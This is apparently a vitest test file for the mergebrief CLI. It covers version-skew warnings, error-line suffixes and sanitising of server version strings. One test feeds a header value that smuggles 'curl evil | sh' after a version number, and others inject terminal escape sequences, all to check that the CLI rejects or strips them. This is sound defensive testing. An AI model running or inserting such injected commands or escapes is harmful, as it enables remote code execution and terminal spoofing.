// Skew lines: the CLI reads `MergeBrief-Version` off the first response of
// the run, warns on a major gap after a successful command, suffixes the one
// error line when versions differ, and stays silent for a dev build.
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { ExitCodes } from "../src/exit";
import { runCli } from "../src/program";
import type { CliDeps } from "../src/types";

interface Answer {
  readonly status?: number;
  readonly body?: unknown;
  readonly serverVersion?: string;
}

interface Run {
  readonly deps: CliDeps;
  readonly out: string[];
  readonly err: string[];
}

interface StubOptions {
  readonly cliVersion?: string;
  readonly env?: Record<string, string>;
  /** A per-path body; absent paths take the answer's body. */
  readonly bodies?: Record<string, unknown>;
}

function stubDeps(answer: Answer, options: StubOptions = {}): Run {
  const configDir = mkdtempSync(join(tmpdir(), "mb-skew-"));
  mkdirSync(configDir, { recursive: true });
  writeFileSync(
    join(configDir, "config.json"),
    JSON.stringify({
      defaultProfile: "default",
      profiles: { default: { baseUrl: "https://mb.example" } },
    }),
  );
  const out: string[] = [];
  const err: string[] = [];
  const headers: Record<string, string> = {
    "content-type": "application/json",
  };
  if (answer.serverVersion !== undefined) {
    headers["mergebrief-version"] = answer.serverVersion;
  }
  return {
    out,
    err,
    deps: {
      fetch: async (input: string) => {
        const path = new URL(input).pathname;
        const body = options.bodies?.[path] ?? answer.body ?? {};
        return new Response(JSON.stringify(body), {
          status: answer.status ?? 200,
          headers,
        });
      },
      env: { MERGEBRIEF_TOKEN: "mergebrief_test", ...options.env },
      configDir,
      cacheDir: mkdtempSync(join(tmpdir(), "mb-skew-cache-")),
      stdout: (text) => out.push(text),
      stderr: (line) => err.push(line),
      readStdin: async () => "",
      gitOriginUrl: () => undefined,
      cliVersion: options.cliVersion ?? "1.2.0",
    },
  };
}

const VERSION_BODY = { version: "1.4.0" };

describe("the major-gap warning on a successful run", () => {
  it("says the CLI is behind when the server is a major ahead", async () => {
    const run = stubDeps({
      body: { version: "2.0.0" },
      serverVersion: "2.0.0",
    });

    const code = await runCli(["auth", "status", "--json"], run.deps);

    expect(code).toBe(ExitCodes.OK);
    expect(run.err).toEqual([
      "mergebrief 1.2.0 is behind this server (2.0.0): some commands may fail. To update, run: npm i -g mergebrief@2.0.0",
    ]);
  });

  it("says the server is behind when the CLI is a major ahead", async () => {
    const run = stubDeps(
      { body: VERSION_BODY, serverVersion: "1.4.0" },
      { cliVersion: "2.0.0" },
    );

    const code = await runCli(["auth", "status", "--json"], run.deps);

    expect(code).toBe(ExitCodes.OK);
    expect(run.err).toEqual([
      "This server (1.4.0) is behind mergebrief 2.0.0: some commands may not exist there. To match it, run: npx mergebrief@1.4.0",
    ]);
  });

  it("picks the npx form when launched through npx", async () => {
    const run = stubDeps(
      { body: { version: "2.0.0" }, serverVersion: "2.0.0" },
      { env: { npm_command: "exec" } },
    );

    await runCli(["auth", "status", "--json"], run.deps);

    expect(run.err[0]).toContain("To update, run: npx mergebrief@2.0.0");
  });

  it("refuses a server version that carries shell text", async () => {
    const run = stubDeps({
      body: { version: "3.0.0" },
      serverVersion: "3.0.0+0; touch /tmp/x && curl evil | sh",
    });

    await runCli(["auth", "status", "--json"], run.deps);

    expect(run.err).toEqual([]);
  });

  it("prints the server version in canonical form, never raw header text", async () => {
    const run = stubDeps({
      body: { version: "3.0.0" },
      serverVersion: "v3.0.0+build.7",
    });

    await runCli(["auth", "status", "--json"], run.deps);

    expect(run.err).toEqual([
      "mergebrief 1.2.0 is behind this server (3.0.0): some commands may fail. To update, run: npm i -g mergebrief@3.0.0",
    ]);
  });

  it("stays silent when the server runs a prerelease", async () => {
    const run = stubDeps({
      body: { version: "3.0.0-rc.1" },
      serverVersion: "3.0.0-rc.1",
    });

    await runCli(["auth", "status", "--json"], run.deps);

    expect(run.err).toEqual([]);
  });

  it("stays silent on a minor gap", async () => {
    const run = stubDeps({ body: VERSION_BODY, serverVersion: "1.4.0" });

    await runCli(["auth", "status", "--json"], run.deps);

    expect(run.err).toEqual([]);
  });

  it("stays silent when either side is a dev build", async () => {
    const devServer = stubDeps({
      body: { version: "dev" },
      serverVersion: "dev",
    });
    await runCli(["auth", "status", "--json"], devServer.deps);
    const devCli = stubDeps(
      { body: { version: "2.0.0" }, serverVersion: "2.0.0" },
      { cliVersion: "0.0.0" },
    );
    await runCli(["auth", "status", "--json"], devCli.deps);

    expect(devServer.err).toEqual([]);
    expect(devCli.err).toEqual([]);
  });

  it("is silenced by MERGEBRIEF_NO_VERSION_WARNING", async () => {
    const run = stubDeps(
      { body: { version: "2.0.0" }, serverVersion: "2.0.0" },
      { env: { MERGEBRIEF_NO_VERSION_WARNING: "1" } },
    );

    const code = await runCli(["auth", "status", "--json"], run.deps);

    expect(code).toBe(ExitCodes.OK);
    expect(run.err).toEqual([]);
  });

  it("goes to the success-notice sink when one is given", async () => {
    const run = stubDeps({
      body: { version: "2.0.0" },
      serverVersion: "2.0.0",
    });
    const notices: string[] = [];

    const deps = {
      ...run.deps,
      successNotice: (line: string) => notices.push(line),
    };
    const code = await runCli(["auth", "status", "--json"], deps);

    expect(code).toBe(ExitCodes.OK);
    expect(run.err).toEqual([]);
    expect(notices).toHaveLength(1);
    expect(notices[0]).toContain("is behind this server");
  });

  it("never prints on a failing run", async () => {
    const run = stubDeps({
      status: 404,
      body: { error: "not found", code: "not-found" },
      serverVersion: "2.0.0",
    });

    const code = await runCli(["repos"], run.deps);

    expect(code).toBe(ExitCodes.NOT_FOUND);
    expect(run.err).toHaveLength(1);
    expect(run.err[0]).not.toContain("is behind");
  });
});

describe("the failure suffix", () => {
  it("ends the one error line with both versions", async () => {
    const run = stubDeps({
      status: 404,
      body: { error: "not found", code: "not-found" },
      serverVersion: "1.4.0",
    });

    const code = await runCli(["repos"], run.deps);

    expect(code).toBe(ExitCodes.NOT_FOUND);
    expect(run.err).toEqual(["not found (HTTP 404) [server 1.4.0, cli 1.2.0]"]);
    expect(run.out).toEqual([]);
  });

  it("names the major gap in the suffix", async () => {
    const run = stubDeps({
      status: 404,
      body: { error: "not found", code: "not-found" },
      serverVersion: "2.0.0",
    });

    await runCli(["repos"], run.deps);

    expect(run.err).toEqual([
      "not found (HTTP 404) [server 2.0.0, cli 1.2.0, major gap]",
    ]);
  });

  it("stays off the line when versions match", async () => {
    const run = stubDeps({
      status: 404,
      body: { error: "not found" },
      serverVersion: "1.2.0",
    });

    await runCli(["repos"], run.deps);

    expect(run.err).toEqual(["not found (HTTP 404)"]);
  });

  it("stays off the line for a dev build", async () => {
    const run = stubDeps({
      status: 404,
      body: { error: "not found" },
      serverVersion: "dev",
    });
    await runCli(["repos"], run.deps);
    const devCli = stubDeps(
      { status: 404, body: { error: "not found" }, serverVersion: "1.4.0" },
      { cliVersion: "0.0.0" },
    );
    await runCli(["repos"], devCli.deps);

    expect(run.err).toEqual(["not found (HTTP 404)"]);
    expect(devCli.err).toEqual(["not found (HTTP 404)"]);
  });

  it("survives MERGEBRIEF_NO_VERSION_WARNING", async () => {
    const run = stubDeps(
      { status: 404, body: { error: "not found" }, serverVersion: "2.0.0" },
      { env: { MERGEBRIEF_NO_VERSION_WARNING: "1" } },
    );

    await runCli(["repos"], run.deps);

    expect(run.err).toEqual([
      "not found (HTTP 404) [server 2.0.0, cli 1.2.0, major gap]",
    ]);
  });

  it("rides a command-level error line, not only the client's", async () => {
    const run = stubDeps(
      { body: { nothing: true }, serverVersion: "2.0.0" },
      { bodies: { "/api/repos": { nothing: true } } },
    );

    const code = await runCli(["-R", "octo/hello", "groups", "7"], run.deps);

    expect(code).toBe(ExitCodes.GENERIC);
    expect(run.err).toHaveLength(1);
    expect(run.err[0]).toMatch(
      /did not match the documented shape.*\[server 2\.0\.0, cli 1\.2\.0, major gap\]$/,
    );
  });

  it("ignores a header whose numbers are not bounded", async () => {
    const run = stubDeps({
      status: 404,
      body: { error: "not found" },
      serverVersion: "99999999999999999999999.0.0",
    });

    await runCli(["repos"], run.deps);

    expect(run.err).toEqual(["not found (HTTP 404)"]);
  });
});

describe("auth status carries the versions", () => {
  it("adds cli.version and passes the release fields through", async () => {
    const run = stubDeps({
      body: {
        version: "1.4.0",
        latest: "1.6.0",
        releaseNotesUrl: "https://example.test/releases/v1.6.0",
        checkedAt: "2026-10-03T10:00:00.000Z",
        breaking: true,
        security: false,
      },
      serverVersion: "1.4.0",
    });

    const code = await runCli(["auth", "status", "--json"], run.deps);

    expect(code).toBe(ExitCodes.OK);
    expect(JSON.parse(run.out.join(""))).toEqual({
      profile: "default",
      baseUrl: "https://mb.example",
      tokenConfigured: true,
      cli: { version: "1.2.0" },
      server: {
        reachable: true,
        authenticated: true,
        version: "1.4.0",
        latest: "1.6.0",
        releaseNotesUrl: "https://example.test/releases/v1.6.0",
        checkedAt: "2026-10-03T10:00:00.000Z",
        breaking: true,
        security: false,
      },
    });
  });

  it("omits the release fields an older server never sent", async () => {
    const run = stubDeps({ body: VERSION_BODY, serverVersion: "1.4.0" });

    await runCli(["auth", "status", "--json"], run.deps);

    expect(JSON.parse(run.out.join(""))).toEqual({
      profile: "default",
      baseUrl: "https://mb.example",
      tokenConfigured: true,
      cli: { version: "1.2.0" },
      server: { reachable: true, authenticated: true, version: "1.4.0" },
    });
  });

  it("prints canonical versions on the human line, controls stripped", async () => {
    const run = stubDeps({
      body: {
        version: "v1.4.0+build.7",
        latest: "1.6.0-\u001b]0;pwned\u0007",
      },
      serverVersion: "1.4.0",
    });

    await runCli(["auth", "status"], run.deps);

    expect(run.out.join("")).toBe(
      "profile default → https://mb.example\n" +
        "token: configured · authenticated · server 1.4.0 · cli 1.2.0 · latest 1.6.0-]0;pwned\n",
    );
  });

  it("strips C0, DEL and C1 controls from a version that is not semver", async () => {
    const run = stubDeps({
      body: { version: "beta\u001b[2J\u007f\u009b2J", latest: "1.6.0" },
      serverVersion: "beta",
    });

    await runCli(["auth", "status"], run.deps);

    expect(run.out.join("")).toBe(
      "profile default → https://mb.example\n" +
        "token: configured · authenticated · server beta[2J2J · cli 1.2.0 · latest 1.6.0\n",
    );
  });
});
